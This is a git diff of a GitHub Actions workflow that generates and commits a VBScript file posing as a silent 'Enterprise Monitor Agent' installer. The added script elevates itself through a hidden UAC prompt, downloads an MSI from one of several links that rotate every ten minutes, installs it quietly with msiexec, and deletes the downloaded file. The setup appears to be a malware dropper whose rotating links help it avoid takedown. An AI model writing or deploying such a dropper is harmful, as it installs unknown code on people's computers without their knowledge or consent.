@@ -8,12 +8,11 @@ on:
 jobs:
   update:
     runs-on: ubuntu-latest
+    permissions:
+      contents: write
     steps:
     - name: Update VBS
       run: |
-        # Clone the repository
-        git clone https://github.com/${{ github.repository }}.git .
-        
         # Define your links (REPLACE WITH YOUR ACTUAL LINKS)
         links=("https://link1.com/dodu" "https://link2.com/dodu" "https://link3.com/dodu")
         
@@ -22,12 +21,52 @@ jobs:
         link_index=$((current_minute / 10 % 3))
         current_link=${links[$link_index]}
         
-        # Replace placeholder in template
-        sed "s/%%CURRENT_LINK%%/$current_link/" installer.vbs.template > installer.vbs
+        # Create the VBS file directly
+        cat > installer.vbs << EOF
+' --------------------------------------------------------------------------
+'  Silent Installer - Enterprise Monitor Agent
+' --------------------------------------------------------------------------
+Option Explicit
+
+' Check for elevation
+If Not WScript.Arguments.Named.Exists("elevated") Then
+    CreateObject("Shell.Application").ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ /elevated", "", "runas", 0
+    WScript.Quit
+End If
+
+Dim strUrl, strTemp, strFile, objXMLHTTP, objADOStream, objFSO, objShell
+strUrl = "$current_link"
+strTemp = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%")
+strFile = strTemp & "\agent_installer.msi"
+
+' Download
+Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
+objXMLHTTP.open "GET", strUrl, False
+objXMLHTTP.send()
+
+If objXMLHTTP.Status = 200 Then
+    Set objADOStream = CreateObject("ADODB.Stream")
+    objADOStream.Open
+    objADOStream.Type = 1 ' Binary
+    objADOStream.Write objXMLHTTP.ResponseBody
+    objADOStream.Position = 0
+    objADOStream.SaveToFile strFile, 2 ' Overwrite
+    objADOStream.Close
+
+    ' Install
+    Set objShell = CreateObject("WScript.Shell")
+    objShell.Run "msiexec /i """ & strFile & """ /quiet /qn /norestart", 0, True
+
+    ' Cleanup
+    Set objFSO = CreateObject("Scripting.FileSystemObject")
+    If objFSO.FileExists(strFile) Then objFSO.DeleteFile strFile
+End If
+EOF
         
-        # Set up git and push changes
-        git config --local user.email "action@github.com"
-        git config --local user.name "GitHub Action"
+    - name: Commit and push
+      run: |
+        git config --global user.email "action@github.com"
+        git config --global user.name "GitHub Action"
         git add installer.vbs
         git commit -m "Update VBS with link: $current_link" || exit 0
         git push
